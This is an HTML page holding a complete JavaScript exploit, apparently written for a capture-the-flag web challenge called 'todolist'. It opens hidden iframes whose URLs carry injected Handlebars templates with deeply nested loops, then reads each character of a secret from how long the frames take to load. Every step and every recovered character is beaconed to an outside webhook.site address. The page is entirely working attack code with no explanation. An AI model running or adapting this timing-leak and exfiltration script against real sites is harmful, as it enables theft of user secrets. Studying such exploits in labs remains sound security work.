<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>.</title></head><body>
<pre id="log"></pre>
<script>
// ── CONFIG ────────────────────────────────────────────────────────────────────
const TARGET  = "https://todolist.challs.srdnlen.it";
const WEBHOOK = "https://webhook.site/591468f2-6ec6-4310-a0b1-0837b7ef0608";
const PREFIX  = "srdnlen{leakycs";  // ← update as you find chars
const CHARSET = "abcdefghijklmnopqrstuvwxyz_0123456789}";
const ARRLEN  = 11;
const DEPTH   = 7;
const MATCH_TIMEOUT = 2000; // ms — no-match loads ~300ms, match blocks >> 2s
const BUDGET  = 54000;      // ms — bot has 60s, we use 54s to be safe
// ─────────────────────────────────────────────────────────────────────────────

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

function ping(msg) {
  document.getElementById("log").textContent += msg + "\n";
  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

// Load one iframe, resolve with {dt, timedOut}
function probe(pos, ch) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    let fired = false;
    const t0  = Date.now();

    function done(timedOut) {
      if (fired) return;
      fired = true;
      clearTimeout(tid);
      try { f.src = "about:blank"; f.remove(); } catch(e) {}
      resolve({ dt: Date.now() - t0, timedOut });
    }

    // If iframe's onload hasn't fired by MATCH_TIMEOUT,
    // Handlebars is still computing → this is the matching char
    const tid = setTimeout(() => done(true), MATCH_TIMEOUT);
    f.onload  = () => done(false);
    f.onerror = () => done(false); // blocked = fast = no match
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

async function run() {
  const t0  = Date.now();
  let flag  = PREFIX;

  ping(`[start] ${flag}`);
  ping(`[info] MATCH_TIMEOUT=${MATCH_TIMEOUT}ms BUDGET=${BUDGET}ms`);

  for (let pos = PREFIX.length; pos < 60; pos++) {
    const elapsed = Date.now() - t0;
    if (elapsed > BUDGET) {
      ping(`[budget] pos=${pos} elapsed=${elapsed}ms — stopping`);
      navigator.sendBeacon(`${WEBHOOK}?BUDGET&flag=${encodeURIComponent(flag)}`);
      break;
    }

    ping(`[pos ${pos}] elapsed=${elapsed}ms`);
    let found = null;

    for (const ch of CHARSET) {
      if (Date.now() - t0 > BUDGET) break;

      const r = await probe(pos, ch);
      ping(`[probe] pos=${pos} ch='${ch}' dt=${r.dt}ms timedOut=${r.timedOut}`);

      if (r.timedOut) {
        found = ch;
        break; // no need to test more chars
      }
    }

    if (found) {
      flag += found;
      ping(`[HIT] pos=${pos} char='${found}'`);
      navigator.sendBeacon(`${WEBHOOK}?FLAG=${encodeURIComponent(flag)}`);
      if (found === "}") break;
    } else {
      ping(`[MISS] pos=${pos} — char not in charset or budget exceeded`);
      navigator.sendBeacon(`${WEBHOOK}?MISS&pos=${pos}&flag=${encodeURIComponent(flag)}`);
      break;
    }
  }

  ping(`[DONE] ${flag} total=${Date.now()-t0}ms`);
  navigator.sendBeacon(`${WEBHOOK}?DONE&flag=${encodeURIComponent(flag)}`);
}

run();
</script>
</body></html>
